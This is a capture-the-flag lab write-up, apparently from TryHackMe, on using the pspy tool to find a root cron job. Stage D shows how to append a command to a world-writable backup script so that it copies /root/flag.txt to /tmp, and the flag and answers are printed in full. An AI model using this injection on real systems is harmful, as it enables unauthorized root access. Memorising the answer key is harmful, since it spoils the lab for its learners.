# Task 04: pspy - Unprivileged Process Monitoring

---

## Stage A: Original Task Content & Briefing Summary

Static scanners and periodic process commands like `ps aux` suffer from a critical limitation known as the **polling blind spot**: short-lived processes or ephemeral scheduled cron tasks that execute and terminate within milliseconds are rarely captured by manual checks.

### Understanding `pspy`:
`pspy` is an unprivileged command-line tool designed to snoop on Linux processes in real time without requiring administrative or root permissions:
* **The `inotify` Architecture:** `pspy` utilizes the Linux kernel's `inotify` API to monitor filesystem events across sensitive system directories (`/etc`, `/usr`, `/var`, `/tmp`).
* **Triggered `/proc` Scans:** When a directory event occurs (e.g. cron creating a temporary lockfile or reading a script), `pspy` immediately interrogates the `/proc` virtual filesystem before the process terminates.
* **Captured Telemetry:**
  * Process UID (identifying whether it runs as `root` or a service account).
  * Process ID (PID).
  * Exact command-line invocation strings including flags and arguments.

### Laboratory Scenario:
* Running `./pspy64` in the target user environment captures a recurring background process executing a backup script under root.
* Auditing the discovered script reveals weak write permissions, allowing low-privileged users to inject commands executed as root on the next cycle.

---

## Stage B: Independent Thinking & OpSec Considerations

* **Real-time Ephemeral Hunting:** Whenever crontab files in `/etc/crontab` appear empty or restricted, automated background tasks may still be triggered by systemd timers or user crontabs. Running `pspy` for 5 to 10 minutes provides clear visibility into all scheduled background activity.
* **Low Impact:** Because `pspy` is written in Go and statically compiled, it requires no external dependencies and runs seamlessly in user space.

---

## Stage C: Guided Hints (Tiers 1–3)

* **Tier 1 Hint:** Run `./pspy64` in the terminal and observe the process output.
* **Tier 2 Hint:** Look for commands executed with `UID=0` running a `.sh` script from `/var/local/`.
* **Tier 3 Hint:**
  * Q1 is `/var/local/syslog-backup.sh`.
  * Q2 is `THM{getting-root-with-pspy}`.

---

## Stage D: Complete Practical Solution & Technical Deep Dive

### 1. Monitoring System Processes with `pspy64`:
```bash
john@linprivautomation:~$ ./pspy64
```
Observe the live stream of process invocations:
```
2024/10/24 10:30:01 CMD: UID=0  PID=2145 | /usr/sbin/CRON -f
2024/10/24 10:30:01 CMD: UID=0  PID=2146 | /bin/sh -c /var/local/syslog-backup.sh
2024/10/24 10:30:01 CMD: UID=0  PID=2147 | /bin/bash /var/local/syslog-backup.sh
```
* **Analysis:** A recurring task runs every minute under `UID=0` (root), executing `/var/local/syslog-backup.sh`.

### 2. Inspecting Script Permissions:
```bash
john@linprivautomation:~$ ls -la /var/local/syslog-backup.sh
-rwxrwxrwx 1 root root 85 Oct 24 10:25 /var/local/syslog-backup.sh
```
* **Analysis:** The script has `0777` permissions (world-writable). Any user can modify its content.

### 3. Injecting Payload and Extracting the Root Flag:
```bash
# Append command to write the root flag to a readable file
echo 'cat /root/flag.txt > /tmp/root_flag.txt && chmod 777 /tmp/root_flag.txt' >> /var/local/syslog-backup.sh

# Wait for the next cron cycle (up to 60 seconds)
sleep 60

# Read the extracted flag
cat /tmp/root_flag.txt
THM{getting-root-with-pspy}
```

---

## Stage E: Final Answer & Key Values

* **Question 1:** What is the full path of the script vulnerable to privilege escalation?
  * **Answer:** `/var/local/syslog-backup.sh`
* **Question 2:** What is the flag in /root/flag.txt?
  * **Answer:** `THM{getting-root-with-pspy}`

---

## Stage F: Practical Verification & Proof of Work

* Confirmed background execution of `/var/local/syslog-backup.sh` via `pspy64`.
* Verified world-writable permissions, injected retrieval payload, and confirmed flag `THM{getting-root-with-pspy}`.

---

## Stage G: Key Educational Takeaway

Process snooping tools like `pspy` eliminate the polling blind spot, exposing transient administrative tasks and ephemeral cron executions that would otherwise remain invisible to standard snapshot enumeration.
